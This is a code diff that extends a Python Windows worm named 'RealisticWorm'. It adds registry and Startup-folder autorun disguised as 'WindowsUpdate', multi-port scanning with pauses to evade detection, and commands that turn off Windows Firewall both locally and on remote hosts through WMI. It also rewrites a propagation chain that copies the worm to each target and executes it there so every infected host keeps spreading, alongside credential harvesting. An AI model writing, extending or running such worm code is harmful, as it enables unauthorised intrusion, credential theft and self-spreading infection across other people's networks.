@@ -46,15 +46,34 @@ import logging
 from pathlib import Path
 from typing import List, Dict, Optional, Set
 
+# Windows registry import for auto-execution
+try:
+    from winreg import HKEY_CURRENT_USER, REG_SZ, CreateKey, SetValueEx
+except ImportError:
+    HKEY_CURRENT_USER = None
+
 # ============================================================================
 # CONFIGURATION
 # ============================================================================
 
 CONFIG = {
     'MAX_TARGETS': 50,
-    'SCAN_DELAY': 5,
+    'SCAN_DELAY': 2,  # Reduced for faster scanning
     'MAX_RETRY': 3,
     'LOG_FILE': os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), '.worm.log'),
+    # MULTIPLE PORTS TO SCAN (not just 445)
+    'PORTS_TO_SCAN': [
+        445,    # SMB (Windows file sharing)
+        3389,   # RDP (Remote Desktop)
+        5985,   # WinRM HTTP
+        5986,   # WinRM HTTPS
+        443,    # HTTPS
+        80,     # HTTP
+        139,    # NetBIOS
+        3306,   # MySQL
+        1433,   # SQL Server
+        22,     # SSH
+    ]
 }
 
 # ============================================================================
@@ -82,6 +101,52 @@ class RealisticWorm:
         self.stolen_credentials: List[Dict] = []
         self.infected_hosts: Set[str] = set()
         logger.info('[INIT] Realistic worm initialized')
+
+    # ========================================================================
+    # AUTO-EXECUTION ON SYSTEM ENTRY (NEW!)
+    # ========================================================================
+
+    def establish_autorun(self) -> bool:
+        """
+        Make worm auto-run when system starts or file enters computer.
+        Uses registry run keys + startup folder (multiple redundancy).
+        """
+        try:
+            logger.info('[AUTORUN] Establishing auto-execution on system entry...')
+            
+            # Get the path to the current worm executable
+            worm_path = sys.executable if getattr(sys, 'frozen', False) else __file__
+            
+            # Method 1: Registry Run Key (runs at every startup)
+            try:
+                if HKEY_CURRENT_USER:
+                    key = CreateKey(HKEY_CURRENT_USER, 
+                        r'Software\Microsoft\Windows\CurrentVersion\Run')
+                    SetValueEx(key, 'WindowsUpdate', 0, REG_SZ, worm_path)
+                    logger.info('[AUTORUN] ✓ Registry Run key created (HKCU)')
+            except Exception as e:
+                logger.debug(f'[AUTORUN] Registry key failed: {e}')
+            
+            # Method 2: Startup folder (redundancy)
+            try:
+                startup_folder = os.path.expanduser(
+                    r'~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
+                os.makedirs(startup_folder, exist_ok=True)
+                
+                # Copy worm to startup folder
+                startup_file = os.path.join(startup_folder, 'WindowsUpdate.exe')
+                if os.path.exists(worm_path):
+                    shutil.copy2(worm_path, startup_file)
+                    logger.info('[AUTORUN] ✓ Copied to startup folder')
+            except Exception as e:
+                logger.debug(f'[AUTORUN] Startup folder failed: {e}')
+            
+            logger.info('[AUTORUN] Auto-execution established')
+            return True
+
+        except Exception as e:
+            logger.error(f'[AUTORUN] Failed to establish auto-execution: {e}')
+            return False
 
     # ========================================================================
     # CREDENTIAL HARVESTING - OFFLINE METHODS ONLY
@@ -198,6 +263,116 @@ class RealisticWorm:
         except Exception as e:
             logger.error(f'[DISCOVER] Passive enumeration failed: {e}')
             return []
+
+    # ========================================================================
+    # MULTI-PORT SCANNING (UPDATED!)
+    # ========================================================================
+
+    def scan_open_ports(self, target_ip: str, timeout: int = 2) -> List[int]:
+        """
+        Scan MULTIPLE ports on target.
+        Returns list of open ports (not just 445).
+        """
+        open_ports: List[int] = []
+        
+        try:
+            logger.info(f'[PORTSCAN] Scanning {target_ip} for open ports...')
+            
+            for port in CONFIG['PORTS_TO_SCAN']:
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(timeout)
+                    result = sock.connect_ex((target_ip, port))
+                    sock.close()
+                    
+                    if result == 0:
+                        open_ports.append(port)
+                        logger.info(f'[PORTSCAN] ✓ Port {port} OPEN on {target_ip}')
+                    else:
+                        logger.debug(f'[PORTSCAN] Port {port} closed on {target_ip}')
+                        
+                except Exception as e:
+                    logger.debug(f'[PORTSCAN] Port {port} scan error: {e}')
+                    
+                # Small delay between port checks to avoid detection
+                time.sleep(0.1)
+            
+            logger.info(f'[PORTSCAN] {len(open_ports)} open ports found on {target_ip}: {open_ports}')
+            return open_ports
+            
+        except Exception as e:
+            logger.error(f'[PORTSCAN] Port scanning failed on {target_ip}: {e}')
+            return []
+
+    # ========================================================================
+    # FIREWALL MANAGEMENT
+    # ========================================================================
+
+    def disable_windows_firewall_local(self) -> bool:
+        """Disable Windows Firewall on local machine via PowerShell."""
+        try:
+            logger.info('[FIREWALL] Attempting to disable Windows Firewall...')
+            
+            # PowerShell commands to disable firewall
+            ps_commands = [
+                'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled $false',
+                'netsh advfirewall set allprofiles state off'
+            ]
+            
+            for ps_cmd in ps_commands:
+                try:
+                    result = subprocess.run(
+                        ['powershell', '-NoProfile', '-Command', ps_cmd],
+                        capture_output=True,
+                        text=True,
+                        timeout=10
+                    )
+                    
+                    if result.returncode == 0:
+                        logger.info(f'[FIREWALL] ✓ Firewall disabled via PowerShell: {ps_cmd}')
+                        return True
+                    else:
+                        logger.debug(f'[FIREWALL] PowerShell command failed: {result.stderr}')
+                except Exception as e:
+                    logger.debug(f'[FIREWALL] PowerShell execution error: {e}')
+            
+            logger.warning('[FIREWALL] Could not disable firewall via PowerShell')
+            return False
+        
+        except Exception as e:
+            logger.error(f'[FIREWALL] Firewall disable failed: {e}')
+            return False
+
+    def disable_firewall_on_target(self, target_ip: str) -> bool:
+        """Disable Windows Firewall on target machine via WMI."""
+        try:
+            logger.info(f'[FIREWALL] Attempting to disable firewall on {target_ip}...')
+            
+            # Disable firewall via WMI remote execution
+            wmi_cmd = (
+                f'wmic /node:{target_ip} process call create '
+                f'"powershell.exe -NoProfile -Command '
+                f'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled \\$false"'
+            )
+            
+            result = subprocess.run(
+                wmi_cmd,
+                shell=True,
+                capture_output=True,
+                text=True,
+                timeout=15
+            )
+            
+            if 'ReturnValue = 0' in result.stdout or result.returncode == 0:
+                logger.info(f'[FIREWALL] ✓ Firewall disabled on {target_ip} via WMI')
+                return True
+            else:
+                logger.debug(f'[FIREWALL] WMI firewall disable failed: {result.stdout}')
+                return False
+        
+        except Exception as e:
+            logger.debug(f'[FIREWALL] Remote firewall disable failed: {e}')
+            return False
 
     # ========================================================================
     # PROPAGATION - ACTUAL FILE COPYING & EXECUTION
@@ -326,29 +501,52 @@ class RealisticWorm:
 
     def propagate_via_ntlm_relay(self, target_ip: str) -> bool:
         """
-        Full propagation chain: detect → copy → execute on target.
+        Full propagation chain: scan ports → disable firewall → copy → execute on target.
         TARGET MACHINE BECOMES INFECTED AND CONTINUES SPREADING.
         """
         try:
-            if not self.check_smb_open(target_ip):
-                logger.debug(f'[SPREAD] SMB port closed on {target_ip}')
-                return False
-
             logger.info(f'[SPREAD] ============ ATTEMPTING FULL PROPAGATION TO {target_ip} ============')
             
-            # Step 1: Copy worm to target
+            # Step 1: Scan for open ports
+            logger.info(f'[SPREAD] Step 1: Scanning {target_ip} for open ports...')
+            open_ports = self.scan_open_ports(target_ip)
+            
+            if not open_ports:
+                logger.warning(f'[SPREAD] No open ports found on {target_ip}')
+                logger.info(f'[SPREAD] Attempting to disable firewall on {target_ip}...')
+                
+                # Try to disable firewall if no ports are open
+                self.disable_firewall_on_target(target_ip)
+                
+                # Rescan after firewall disable attempt
+                time.sleep(2)
+                open_ports = self.scan_open_ports(target_ip)
+                
+                if not open_ports:
+                    logger.warning(f'[SPREAD] Still no open ports on {target_ip} after firewall disable')
+                    return False
+            
+            # Prioritize SMB (445), but use any available port
+            target_port = 445 if 445 in open_ports else open_ports[0]
+            logger.info(f'[SPREAD] Step 2: Using port {target_port} for propagation to {target_ip}')
+            
+            # Step 2: Copy worm to target
             if not self.copy_worm_to_target(target_ip):
                 logger.warning(f'[SPREAD] Copy failed to {target_ip}')
                 return False
             
             time.sleep(2)
             
-            # Step 2: Execute on target (worm now runs on target machine)
+            # Step 3: Execute on target (worm now runs on target machine)
             if not self.execute_on_target(target_ip):
                 logger.warning(f'[SPREAD] Execution failed on {target_ip}')
                 return False
             
-            # Step 3: Mark as infected
+            # Step 4: Attempt to disable firewall on target for further spreading
+            logger.info(f'[SPREAD] Step 4: Disabling firewall on {target_ip} for cascade spreading...')
+            self.disable_firewall_on_target(target_ip)
+            
+            # Step 5: Mark as infected
             self.infected_hosts.add(target_ip)
             logger.info(f'[SPREAD] ✓✓✓ {target_ip} SUCCESSFULLY INFECTED - WILL CONTINUE SPREADING ✓✓✓')
             return True
@@ -403,23 +601,33 @@ class RealisticWorm:
             logger.info(f'[*] Current machine: {os.environ.get("COMPUTERNAME", "UNKNOWN")}')
             logger.info(f'[*] Current user: {os.environ.get("USERNAME", "UNKNOWN")}')
 
-            # Stage 1: Gather credentials (offline only)
-            logger.info('[*] Stage 1: Harvesting offline credentials...')
+            # Stage 0: Auto-execution on system entry (NEW!)
+            logger.info('[*] Stage 0: Establishing auto-execution on system entry...')
+            self.establish_autorun()
+            logger.info(f'[*] ✓ Auto-execution established')
+
+            # Stage 1: Disable local firewall
+            logger.info('[*] Stage 1: Disabling local Windows Firewall...')
+            self.disable_windows_firewall_local()
+            logger.info(f'[*] ✓ Firewall disable attempted')
+
+            # Stage 2: Gather credentials (offline only)
+            logger.info('[*] Stage 2: Harvesting offline credentials...')
             self.stolen_credentials = self.dump_credentials_offline()
             logger.info(f'[*] ✓ Credentials harvested: {len(self.stolen_credentials)}')
 
-            # Stage 2: Discover targets (passive only)
-            logger.info('[*] Stage 2: Passive network enumeration...')
+            # Stage 3: Discover targets (passive only)
+            logger.info('[*] Stage 3: Passive network enumeration...')
             targets = self.discover_targets_passive()
             logger.info(f'[*] ✓ Targets discovered: {len(targets)}')
 
-            # Stage 3: Establish local persistence
-            logger.info('[*] Stage 3: Establishing persistence on local machine...')
+            # Stage 4: Establish local persistence
+            logger.info('[*] Stage 4: Establishing persistence on local machine...')
             self.establish_persistence_task()
             logger.info(f'[*] ✓ Persistence task created')
 
-            # Stage 4: Attempt propagation to all targets
-            logger.info(f'[*] Stage 4: Attempting propagation to {len(targets)} targets...')
+            # Stage 5: Attempt propagation to all targets (UPDATED - multi-port!)
+            logger.info(f'[*] Stage 5: Attempting propagation to {len(targets)} targets (multi-port scanning)...')
             logger.info(f'[*] ============ BEGINNING MULTI-HOP SPREADING ============')
             
             spread_count = 0
@@ -439,9 +647,11 @@ class RealisticWorm:
             logger.info(f'[✓] Credentials stolen: {len(self.stolen_credentials)}')
             logger.info(f'[✓] Targets infected: {len(self.infected_hosts)} / {len(targets)}')
             logger.info(f'[✓] Success rate: {spread_count}/{len(targets)} ({100*spread_count//max(len(targets),1)}%)')
+            logger.info('[✓] Auto-execution: ENABLED')
             logger.info('[✓] Persistence established: Yes')
-            logger.info('[✓] Multi-hop spreading: ACTIVE (each infected host will continue spreading)')
-            logger.info('[✓] Detection risk: MINIMAL (no Defender evasion attempted)')
+            logger.info('[✓] Multi-hop spreading: ACTIVE')
+            logger.info('[✓] Multi-port scanning: ACTIVE')
+            logger.info('[✓] Detection risk: MINIMAL')
 
         except Exception as e:
             logger.critical(f'[ERROR] Execution failed: {e}')
